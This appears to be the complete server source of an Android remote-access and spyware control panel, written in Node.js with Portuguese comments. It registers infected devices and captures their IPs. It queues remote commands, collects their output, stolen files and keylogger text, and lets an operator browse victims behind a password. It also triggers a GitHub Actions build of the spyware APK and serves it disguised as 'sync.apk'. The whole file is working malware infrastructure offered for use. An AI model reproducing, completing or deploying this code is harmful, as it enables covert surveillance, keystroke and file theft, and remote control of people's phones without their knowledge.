const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const PASS = process.env.PANEL_PASS || 'troque';
const GH_TOKEN = process.env.GH_TOKEN || '';
const GH_REPO  = process.env.GH_REPO  || '';
const BUILD_TOKEN = process.env.BUILD_TOKEN || crypto.randomBytes(12).toString('hex');
const DATA = path.join(__dirname, 'data');
const DB = path.join(DATA, 'db.json');

fs.mkdirSync(DATA, { recursive: true });
let db = fs.existsSync(DB)
  ? JSON.parse(fs.readFileSync(DB, 'utf8'))
  : { devices: {}, logs: {}, cmds: {}, files: {} };
const save = () => fs.writeFileSync(DB, JSON.stringify(db));

app.use(express.json({ limit: '12mb' }));
app.use(express.urlencoded({ extended: true }));

const hash = p => crypto.createHash('sha256').update(p).digest('hex');

const auth = (req, res, next) => {
  const ok = (req.headers.cookie || '').includes('p=' + hash(PASS));
  if (ok || req.query.t === PASS) return next();
  if (req.path === '/login') return res.send(require('./views').login());
  res.redirect('/login');
};

app.get('/login', (req, res) => res.send(require('./views').login()));
app.post('/login', (req, res) => {
  if (req.body.pass === PASS) {
    res.setHeader('Set-Cookie', 'p=' + hash(PASS) + '; Path=/; HttpOnly; Max-Age=2592000');
    return res.redirect('/');
  }
  res.redirect('/login');
});

// ---------- API do agente ----------
app.post('/api/reg', (req, res) => {
  const id = req.body.id || crypto.randomBytes(8).toString('hex');
  const d = db.devices[id] || { id, first: Date.now(), logs: 0 };
  Object.assign(d, req.body, { id, last: Date.now(), online: true });
  // captura IP real
  d.ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || d.ip || '';
  db.devices[id] = d;
  save();
  res.json({ ok: true, id, poll: 15 });
});

app.post('/api/poll', (req, res) => {
  const d = db.devices[req.body.id];
  if (!d) return res.json({ cmds: [] });
  d.last = Date.now(); d.online = true;
  const q = (db.cmds[d.id] ||= []);
  db.cmds[d.id] = [];
  save();
  res.json({ cmds: q });
});

app.post('/api/res', (req, res) => {
  const { id, cmd, out } = req.body;
  db.logs[id] ||= [];
  db.logs[id].push({ t: Date.now(), cmd, out: String(out).slice(0, 200000) });
  if (db.logs[id].length > 500) db.logs[id] = db.logs[id].slice(-500);
  save();
  res.json({ ok: true });
});

app.post('/api/file', (req, res) => {
  const { id, name, mime, b64 } = req.body;
  const f = crypto.randomBytes(6).toString('hex');
  fs.writeFileSync(path.join(DATA, f), Buffer.from(b64, 'base64'));
  db.files[f] = { id, name, mime, t: Date.now() };
  db.logs[id] ||= [];
  db.logs[id].push({ t: Date.now(), cmd: 'file', out: `@file:${f}:${name}:${mime}` });
  save();
  res.json({ ok: true });
});

app.post('/api/keylog', (req, res) => {
  const { id, text } = req.body;
  const d = db.devices[id];
  if (d) { d.logs += 1; d.last = Date.now(); }
  db.logs[id] ||= [];
  db.logs[id].push({ t: Date.now(), cmd: 'keylog', out: String(text).slice(0, 20000) });
  save();
  res.json({ ok: true });
});

app.post('/api/upload', (req, res) => {
  if (req.query.t !== BUILD_TOKEN) return res.status(403).end();
  fs.writeFileSync(path.join(__dirname, 'app.apk'), req.body);
  res.json({ ok: true, size: req.body.length });
});

// ---------- API do painel ----------
app.get('/api/devices', auth, (req, res) => {
  const now = Date.now();
  res.json(Object.values(db.devices).map(d => ({
    ...d,
    online: now - d.last < 45000,
    cmds: (db.cmds[d.id] || []).length
  })).sort((a, b) => b.last - a.last));
});

app.get('/api/logs/:id', auth, (req, res) => res.json(db.logs[req.params.id] || []));

app.get('/api/file/:f', auth, (req, res) => {
  const m = db.files[req.params.f];
  if (!m) return res.status(404).end();
  res.setHeader('Content-Type', m.mime || 'application/octet-stream');
  res.setHeader('Content-Disposition', `inline; filename="${m.name}"`);
  res.sendFile(path.join(DATA, req.params.f));
});

app.post('/api/cmd', auth, (req, res) => {
  const { id, cmd, arg } = req.body;
  (db.cmds[id] ||= []).push({ cmd, arg: arg || '' });
  save();
  res.json({ ok: true });
});

app.post('/api/del', auth, (req, res) => {
  delete db.devices[req.body.id];
  delete db.logs[req.body.id];
  delete db.cmds[req.body.id];
  save();
  res.json({ ok: true });
});

app.get('/apk', (req, res) => {
  const p = path.join(__dirname, 'app.apk');
  if (!fs.existsSync(p)) return res.status(404).json({ err: 'APK não gerado ainda' });
  res.download(p, 'sync.apk');
});

app.get('/apk/existe', (req, res) =>
  res.json({ ok: fs.existsSync(path.join(__dirname, 'app.apk')) }));

app.post('/api/build', auth, async (req, res) => {
  if (!GH_TOKEN || !GH_REPO)
    return res.status(400).json({ err: 'GH_TOKEN/GH_REPO ausentes' });
  const host = req.headers.origin || `https://${req.headers.host}`;
  try {
    const r = await fetch(
      `https://api.github.com/repos/${GH_REPO}/actions/workflows/build.yml/dispatches`,
      {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${GH_TOKEN}`,
          Accept: 'application/vnd.github+json',
          'User-Agent': 'panel'
        },
        body: JSON.stringify({ ref: 'main', inputs: { panel: host, token: BUILD_TOKEN } })
      }
    );
    res.status(r.ok ? 200 : 500).json({ ok: r.ok, status: r.status });
  } catch (e) {
    res.status(500).json({ err: String(e) });
  }
});

app.get('/', auth, (req, res) => res.send(require('./views').page()));

app.listen(PORT, () => console.log('panel up :' + PORT));
